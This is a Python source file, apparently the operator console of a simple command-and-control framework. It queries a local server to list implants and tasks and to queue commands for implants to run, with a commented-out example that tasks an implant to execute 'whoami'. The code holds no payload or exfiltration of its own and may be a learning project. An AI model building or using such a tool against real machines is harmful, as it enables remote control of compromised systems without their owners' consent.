import requests 
from urllib.parse import urljoin
import shlex
import os


URL = "http://localhost:5000"


def make_task(implant_id, cmd, args ):
    enpoint = "/task/create"
    url = urljoin(URL, enpoint)
    r = requests.post(url, json= {
        "cmd": cmd, 
        "args": args, 
        "implant_id": implant_id
    })
    if r.status_code != 200:
        print(r.content)
        return
    else:
        data = r.json()
        return data.get("msg")

def print_banner():
    print("GOTTA GO FAST")


def cls(args = []):
    os.system("clear")
    return True

def list_implants(args = ""):
    #TODO: add filter for keys
    endpoint = "/implant/list"
    url = urljoin(URL, endpoint)
    r = requests.get(url)
    if r.status_code == 200:
        return r.json()
    else:
        print("Failed to list implants!")
        return []

def create_task(args = ""):
    endpoint = "/task/create"
    url = urljoin(URL, endpoint)
    #implant_id cmd args
    task_args = shlex.split(args)
    if len(args) < 3:
        print("Invalid number of arguemnts: Usage: create_task <implant_id> <cmd> <args>")
        return False 
    implant_id = task_args[0]
    cmd = task_args[1]
    cmd_args = " ".join(task_args[2:])
    payload = {"implant_id": implant_id, "cmd": cmd, "args": cmd_args}
    r = requests.post(url, json=payload)
    if r.status_code == 200:
        data = r.json()
        return data
    else:
        print("Failed to create task!")
        return []


def list_tasks(args = ""):
    #TODO: add filter for keys
    # TODO: filter for active tasks
    endpoint = "/task/list"
    url = urljoin(URL, endpoint)
    r = requests.get(url)
    if r.status_code == 200:
        return r.json()
    else:
        print("Failed to list tasks")
        return []




dispatch_table = {
    "list_implants":[list_implants, "list all commands"],
    "list_tasks": [list_tasks, "list all tasks"],
    "create_task": [create_task, "Create task for implant"],
    "clear" :[cls, "clear terminal screen"]
}

def default_handler(args=""):
    print("No matching command found!")
    cmds = list(dispatch_table.keys())
    print(f"Avaiable commands: {cmds}")
    return []


def client_loop():
    print_banner()
    while True:
        client_input = input(">")
        args = shlex.split(client_input)
        if len(args) <1:
            print("Invalid number of arguments")
        print("DEBUG", args)
        cmd = args[0]
        f, help = dispatch_table.get(cmd, [default_handler, "you done goofed!"])
        if len(args) >= 2:
            cmd_args = " ".join(args[1:])
        else:
            cmd_args = []
        result = f(cmd_args)
        if result:
            print(result)



if __name__ == "__main__":
    #id = "a81a2fde6c750618b037b4b85685eef8"
    #make_task(id, "execute", "whoami")
    client_loop()